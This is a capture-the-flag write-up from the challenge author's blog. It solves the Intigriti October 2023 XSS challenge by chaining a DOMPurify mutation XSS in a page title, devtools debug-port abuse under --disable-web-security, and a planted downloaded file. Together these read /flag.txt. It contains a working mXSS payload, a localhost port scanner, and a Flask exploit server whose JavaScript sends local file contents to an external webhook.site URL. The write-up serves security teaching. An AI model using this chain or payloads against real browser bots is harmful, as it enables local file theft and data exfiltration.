---
source: kevin-mizu
source_url: https://mizu.re/post/intigriti-october-2023-xss-challenge
title: "Intigriti October 2023 - XSS Challenge | mizu.re"
description: "Intigriti October 2023 - XSS Challenge"
---

_keyboard\_arrow\_up_

title: Intigriti October 2023 - XSS Challenge

date: Nov 01, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [XSS](https://mizu.re/tag/XSS)

# Intigriti October 2023 - XSS Challenge

![](https://mizu.re/articles/writeups/Intrigriti_XSS/october2023/images/intigriti.png)

* * *

Find the flag and win Intigriti swag.

Author: Me :3

Rules:

- This challenge runs from the 30th of October until the 6th of November, 11:59 PM UTC.
- Out of all correct submissions, we will draw **six** winners on Tuesday, the 11th of April:

  - Three randomly drawn correct submissions
  - Three best write-ups
- Every winner gets a €50 swag voucher for our [swag shop](https://swag.intigriti.com/).
- The winners will be announced on our [Twitter profile](https://twitter.com/intigriti).
- For every 100 likes, we'll add a tip to [announcement tweet](https://go.intigriti.com/challenge-tips).
- Join our [Discord](https://go.intigriti.com/discord) to discuss the challenge!

The solution...

- Should retrieve the flag.txt
- Should leverage a cross site scripting vulnerability on this domain.
- Shouldn't be self-XSS or related to MiTM attacks.
- Should NOT use another challenge on the intigriti.io domain.
- Should be reported at go.intigriti.com/submit-solution.
- Should require no user interaction.

Test your payloads down below and on the challenge page here!

Let's pop an alert!

* * *

## Table of content

- [🕵️ Website preview](https://mizu.re/post/intigriti-october-2023-xss-challenge#%EF%B8%8F-website-preview)
- [💥 XSS](https://mizu.re/post/intigriti-october-2023-xss-challenge#-xss)
- [🛠️ Devtools](https://mizu.re/post/intigriti-october-2023-xss-challenge#%EF%B8%8F-devtools)
- [📄 LFI](https://mizu.re/post/intigriti-october-2023-xss-challenge#-lfi)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/intigriti-october-2023-xss-challenge#-tldr-chain-everything-together)
- [🚩 Retrieve the flag](https://mizu.re/post/intigriti-october-2023-xss-challenge#-retrieve-the-flag)

## 🕵️ Website preview

![site.gif](https://mizu.re/articles/writeups/Intrigriti_XSS/october2023/images/site.gif)

## 💥 XSS

Using the source code available at the bottom of each page, it is possible to gather the following information:

- src/views/inc/header.ejs: insecure usage of ejs template leading to HTML injection:

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intigriti XSS Challenge - <%- title %></title>
```

- src/app.js \> 404: controled input into the title variable.

```javascript
app.use((req, res) => {
    res.status(404);
    res.render("404", { title: getTitle(req.path) });
})
```

- src/app.js \> getTitle: function used to troncate and sanitize a path using [DOMPurify](https://github.com/cure53/DOMPurify).

```javascript
const getTitle = (path) => {
    path = decodeURIComponent(path).split("/");
    path = path.slice(-1).toString();
    return DOMPurify.sanitize(path);
}
```

Even though a state-of-the-art sanitizer ( [DOMPurify](https://github.com/cure53/DOMPurify)) is in use, this situation is quite special due to:

- The use of a server-side sanitizer.
- Sanitized input reflected inside the <title> tag.

> Why are these details important?

Because this is a typical server-side \> client-side mutation XSS situation!

How does this kind of issue occur?

To understand how a mXSS can occur, it is crucial to understand the discrepancy between what the sanitizer ( [DOMPurify](https://github.com/cure53/DOMPurify)) sees against what the client receives:

![](https://mizu.re/articles/writeups/Intrigriti_XSS/october2023/images/mXSS.png)

From the sanitizer perspective, it's unaware that the current sanitizing input is nested within a <title> tag while the browser will receive the whole page once.

This parsing differential allows exploitation of the browser's parsing priority for the <title> tag, enabling a mutation XSS attack!

_More information about this type of vulnerability can be found [here](https://research.securitum.com/dompurify-bypass-using-mxss/)._

Therefore, this approach won't work directly in the challenge context because the getTitle function splits the user input on /. To bypass this restriction, it is important to understand how does [DOMPurify](https://github.com/cure53/DOMPurify) works:

1\. Generate a DOM Tree using new DOMParser().parseFromString(unsafe\_HTML, "text/html") ( [ref](https://github.com/cure53/DOMPurify/blob/60ecd302248c2fb3ae7489af47be339a741c2dbe/src/purify.js#L869)).

2\. Sanitize the DOM Tree based on the provided configuration ( [ref](https://github.com/cure53/DOMPurify/blob/60ecd302248c2fb3ae7489af47be339a741c2dbe/src/purify.js#L1471C13-L1471C13)).

3\. Serialize the DOM Tree back to a string using body.innerHTML ( [ref](https://github.com/cure53/DOMPurify/blob/60ecd302248c2fb3ae7489af47be339a741c2dbe/src/purify.js#L1518)).

Thanks to the innerHTML serialization, HTML attributes value are HTML decoded!

```javascript
var dom_tree = new DOMParser().parseFromString(`<p id="<&sol;title><h1>HELLO :)</h1>"></p>`, "text/html");
dom_tree.body.innerHTML;
```

![decoded_attr.png](https://mizu.re/articles/writeups/Intrigriti_XSS/october2023/images/decoded_attr.png)

Taking advantage of this, navigating to /<p id="<%26sol%3Btitle><script>alert()<%26sol%3Bscript>"> result in an XSS 🔥

![xss.png](https://mizu.re/articles/writeups/Intrigriti_XSS/october2023/images/xss.png)

## 🛠️ Devtools

For this month's challenge, getting an XSS isn,'t enough to solve the challenge. In fact, you must also read /flag.txt.

> But, how can a local file be accessed from a client side XSS?

Indeed, in the context of orchestrated browsers, there are several ways to accomplish this:

- PDF generation tool (chromium <= 114): [https://bugs.chromium.org/p/chromium/issues/detail?id=1385982](https://bugs.chromium.org/p/chromium/issues/detail?id=1385982)
- No sandbox headless chrome (chromium <= 116): [https://bugs.chromium.org/p/chromium/issues/detail?id=1458911](https://bugs.chromium.org/p/chromium/issues/detail?id=1458911)
- ...

Unfortunately, none of those issues would work in the challenge context (chromium 117). Thus, to achieve the local file disclosure, it is important to focus on the bot's configuration:

- src/bot.js:

```javascript
const browser = await puppeteer.launch({
    headless: "new",
    ignoreHTTPSErrors: true,
    args: [\
        "--no-sandbox",\
        "--ignore-certificate-errors",\
        "--disable-web-security"\
    ],
    executablePath: "/usr/bin/chromium-browser"
});
```

From the above snippet, we can get see that --disable-web-security is enabled! This is a crucial part of the exploitation as it disables the [Same Origin Policy](https://web.dev/articles/same-origin-policy), allowing Javascript to interact with any website. For example:

```javascript
const leak_url = "https://webhook.site/332b8b7a-9a08-4c3e-bb5d-59bf9b1bc95f";

fetch("https://mizu.re").then(d => d.text()).then((d) => {
    // Leak cross-site content
    fetch(leak_url, { method: "POST", body: d });
})
```

> So, if we fetch file:///flag.txt we can get the flag?

Not really :/ Nowadays, browser security limits file:/// access, even if the [Same Origin Policy](https://web.dev/articles/same-origin-policy) is disabled.

Thus, if it isn't a file:/// to file:/// request, it won't work!

> Then, how could we abuse this?

In fact, there's still an interesting browser feature: devtools debug port ❤️

This can be use to remotely control a chromium browser and it is enabled by default on puppeteer! This HTTP service is open randomly port inside 30000 \- 50000 (setting it to 0 = random) and can be used to: ( [ref](https://github.com/puppeteer/puppeteer/blob/4f999b3bf9b51fcaa01d9cd2c795785fc36a5941/packages/puppeteer-core/src/node/ChromeLauncher.ts#L110C33-L110C54))

- /json/version: Get browser information.
- /json/protocol: List enabled features.
- /json/list: List currently open tabs.
- /json/new?{URL}: Open URL in a new tab. PUT method is needed since 04/22 ( [code](https://source.chromium.org/chromium/chromium/src/+/main:content/browser/devtools/devtools_http_handler.cc;l=621)).
- /json/activate/{PAGE-ID}: Activate the associated page.
- /json/close/{PAGE-ID}: Close the associated page.
- ...

So, due to the --disable-web-security flag, it is possible to communicate freely with the devtools debug port! However, this is where it becomes tricky. Indeed, since [chromium 115](https://source.chromium.org/chromium/chromium/src/+/0154caeefc74530d5cb57ce71608beb1b77bca39), it is not possible to communicate with the websocket if --remote-allow-origins is not in use, which is the case of the challenge.

Therefore, if we could somehow control a file on the local system, we would be able to:

1\. Use devtools debug port to open file:///.

2\. Trigger an XSS on file:///.

3\. Abuse --disable-web-security to read and leak /flag.txt.

## 📄 LFI

The easiest way to control file on the local system, is to abuse auto-download features which is enabled by default on the [new headless mode](https://developer.chrome.com/articles/new-headless/) of chromium! 👀

Here is a small code to do it:

```py
from flask import Flask, Response
app = Flask(__name__)

@app.route("/dl/<path:path>")
def download(path):
    return Response("mizu :p", mimetype="application/octet-stream;charset=utf-8")

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

Sending the bot to /dl/poc.html will download the file to /home/challenge/Downloads/poc.html.

Then, in order to get an the flag, we just need to embed the flag into an iframe and read it using javascript :p

```html
<iframe src="file:///flag.txt"></iframe>
<script>
    const exfilt_url   = "https://webhook.site/332b8b7a-9a08-4c3e-bb5d-59bf9b1bc95f";
    fetch(`${exfilt_url}?log=starting_exploit`);

    setTimeout(() => {
        var x = btoa(frames[0].window.document.body.innerHTML);
        fetch(`${exfilt_url}?file_content=${x}`);
    }, 200)
</script>
```

## 💥 TL/DR: Chain everything together

1\. Auto download a file → default path /home/<user>/Downloads/<file-name>.

2\. Find debug port.

3\. PUT to open downloaded file:/// in a new tab.

4\. Use file context + no SOP -> iframe to leak local file content.

```python
from flask import Flask, Response
from time import sleep

app = Flask(__name__)
app.config["DEBUG"] = True
exfilt_url   = "https://webhook.site/332b8b7a-9a08-4c3e-bb5d-59bf9b1bc95f"
exploit_path = "file:///home/challenge/Downloads/poc.html"
wanted_page  = "file:///flag.txt"

@app.route("/dl/<path:path>")
def download(path):
    return Response("""
    <iframe src="%s"></iframe>
    <script>
        const exfilt_url   = "%s";
        fetch(`${exfilt_url}?log=starting_exploit`);

        setTimeout(() => {
            var x = btoa(frames[0].window.document.body.innerHTML);
            fetch(`${exfilt_url}?file_content=${x}`);
        }, 200)
    </script>
    """ % (wanted_page, exfilt_url)
    , mimetype="application/octet-stream;charset=utf-8")

@app.route("/wait")
def wait():
    sleep(30)
    return "OK!"

@app.route("/")
def index():
    return """
    <img src="/wait">
    <script>open("/dl/poc.html")</script>
    <script>
        const exfilt_url   = "%s";
        const exploit_path = "%s";

        // Open poc.html
        const run_exploit = (p) => {
            fetch(`${exfilt_url}?log=openning_file&path=${exploit_path}`);
            fetch(`http://localhost:${p}/json/new?${exploit_path}`, {
                method: "PUT"
            })
        }

        // Search port
        const test_port = (p) => {
            var script = document.createElement("script");
            script.src = `http://localhost:${p}/json/list`;

            script.onload = () => {
                fetch(`${exfilt_url}/port=${p}`);
                run_exploit(p);
            }
            script.onerror = () => {
                if (p %% 1000 == 0) {
                    fetch(`${exfilt_url}/log=FAILLURE&port=${p}`);
                }
                test_port(p+1);
            }

            document.body.appendChild(script);
        }

        fetch(`${exfilt_url}?log=start_port_fuzzing`);
        test_port(30000);
    </script>
    """ % (exfilt_url, exploit_path)

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

## 🚩 Retrieve the flag

Run the python script and navigate to: /api/report?url=/<p id="<%26sol%3Btitle><script>location.href='http:%26sol%3B%26sol%3B172.17.0.1:5000'<%26sol%3Bscript>">.

Flag: INTIGRITI{Pupp3t3eR\_wIth0ut\_S0P\_LFI} 🎉

[_keyboard\_arrow\_left_ Insecure Session Storage](https://mizu.re/post/insecure-session-storage)

[Linux local electron application script-src: self bypass _keyboard\_arrow\_right_](https://mizu.re/post/linux-local-electron-application-script-src-self-bypass)